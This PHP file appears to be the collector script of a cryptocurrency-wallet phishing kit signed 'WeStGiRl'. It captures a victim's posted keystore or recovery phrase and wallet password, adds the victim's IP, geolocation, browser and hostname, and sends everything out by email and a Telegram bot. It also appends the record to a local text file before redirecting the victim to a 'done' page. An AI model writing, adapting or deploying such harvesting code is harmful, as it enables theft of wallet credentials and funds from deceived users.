<?php
session_start();
include("system.php"); 
include("detect.php"); 
include("email.php"); 
require("telegramid.php");

$keystore = $_SESSION['keystore'] = htmlentities($_POST['phrase']);
$type = $_SESSION['type'] = $_POST['type'];
$category = $_SESSION['category'] = $_POST['category'];
$password = $_SESSION['password'] = $_POST['password'];

$ip = getenv("REMOTE_ADDR");
$addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip));
$country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));
$timedate = date("D/M/d, Y g:i a"); 
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$message  = "---------------+ Wallets +--------------\n";
$message .= "Wallet-Type: ".$_SESSION['type']."\n";
$message .= "Category: ".$_SESSION['category']."\n";
$message .= "Keystore: ".$_SESSION['keystore']."\n";
$message .= "Password: ".$_SESSION['password']."\n";
$message .= "IP: ".$ip."\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "Browser:".$browserAgent."\n";
$message .= "DateTime: ".$timedate."\n";
$message .= "country: ".$country."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "---------------Created By WeStGiRl-----------------\n";

$subject = "Wallets Keystore $ip | ".$_POST['type']." ".$_POST['keystore']."\n";
$headers = "From: Ali<logs@o2.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail(','.$form,$subject,$message);
    $text = fopen('westgirl.txt', 'a');
fwrite($text, $message);
mail("$send", "$subject", $message);
send_telegram_msg($message);
$praga=rand();
$praga=md5($praga);
header("Location: done.html");

?>	  